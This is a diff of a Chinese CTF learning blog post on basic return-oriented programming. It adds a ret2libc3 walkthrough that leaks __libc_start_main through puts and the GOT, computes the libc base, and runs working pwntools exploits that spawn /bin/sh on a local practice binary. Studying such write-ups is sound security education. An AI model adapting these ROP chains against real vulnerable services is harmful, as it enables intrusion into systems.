@@ -68,8 +68,15 @@
 <meta property="og:image" content="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/42.png">
 <meta property="og:image" content="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/43.png">
 <meta property="og:image" content="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/44.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/45.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/46.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/47.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/48.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/49.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/50.png">
+<meta property="og:image" content="https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/51.png">
 <meta property="article:published_time" content="2021-11-26T05:47:47.000Z">
-<meta property="article:modified_time" content="2021-11-30T11:01:59.796Z">
+<meta property="article:modified_time" content="2021-12-10T08:42:58.662Z">
 <meta property="article:author" content="b1ackie">
 <meta property="article:tag" content="ROP">
 <meta name="twitter:card" content="summary_large_image">
@@ -255,7 +262,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4.9k 字
+      6.6k 字
     </span>
   
 
@@ -264,7 +271,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      15 分钟
+      21 分钟
     </span>
   
 
@@ -305,7 +312,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021-11-30 晚上
+                  本文最后更新于：2021-12-10 下午
                 
               </p>
             
@@ -450,6 +457,32 @@
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br><br>pop_ret_addr = <span class="hljs-number">0x804843d</span><br>gets_addr = <span class="hljs-number">0x8048460</span><br>system_addr = <span class="hljs-number">0x8048490</span><br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br><span class="hljs-comment">#第一种方法</span><br><span class="hljs-comment">#payload = &#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ret_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;b&#x27;*4 + p32(buf2_addr)</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(gets_addr) + p32(system_addr) + p32(buf2_addr)+ p32(buf2_addr)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/44.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h4><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p>
+<p>查看保护只开启了NX。</p>
+<p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/45.png" srcset="/img/loading.gif" lazyload></p>
+<p>看到存在栈溢出，可以尝试ROP。此例子是在例2的基础上，将<code>system</code>函数的地址去掉，此时需要同时找到<code>system</code>函数地址和</p>
+<p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/46.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在的问题就是如何寻找<code>system</code>函数的地址。</p>
+<p><code>system</code>函数属于<code>libc</code>，而<code>libc.so</code>动态链接库中的函数相对偏移是固定的。即使程序有ASLR，最低的12位也不会改变，而libc在<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">github</a>上有人进行收集。</p>
+<p>我们如果知道了libc中某个函数的地址，那么就可以确定该程序利用的libc，进而可以知道system函数的地址。得到libc中函数地址一般是用got表泄露，就是输出某个函数对应的got表项的内容。当然，由于libc的延迟绑定机制，我们需要泄露已经执行过得函数的地址。</p>
+<p>现在来手工先寻找一下这些地址，来加深理解。</p>
+<p>先来寻找一下libc的基址，使用gdb加载libc3，然后打印出<code>__libc_start_main</code>的地址</p>
+<p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/47.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用<code>ldd</code>命令可以查看程序依赖的libc版本，再将其复制到当前路径下</p>
+<p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/48.png" srcset="/img/loading.gif" lazyload></p>
+<p>搜索<code>__libc_start_main</code>可以看到其偏移是<code>0x18e30</code>，由此可以算出基址是</p>
+<blockquote>
+<p>0xf7df5e30-0x18e30=0xf7ddd000</p>
+</blockquote>
+<p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/49.png" srcset="/img/loading.gif" lazyload></p>
+<p>有了基址就可以计算出其他的地址</p>
+<p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/50.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在的思路就是，通过现有的函数打印出<code>__libc_start_main</code>的地址，然后寻找<code>libc</code>中的地址，来计算基址，有了基址，查找到<code>system</code>和<code>/bin/sh</code>的偏移就可以得到。</p>
+<p>现在编写个EXP，通过利用<code>LibcSearcher</code>可以快速的帮助查找。</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, main, libc_start_main_got])<br>sh.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get the related addr&quot;</span><br>libc_start_main_addr = u32(sh.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)<br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get shell&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/51.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习CTF wiki上的基本rop技术，很多文字性的描述就直接用了上面的描述，原理性的东西基本都理解了，利用方式也都理解，后续还需要多多练习一下。</p>
 
             </div>
             <hr>
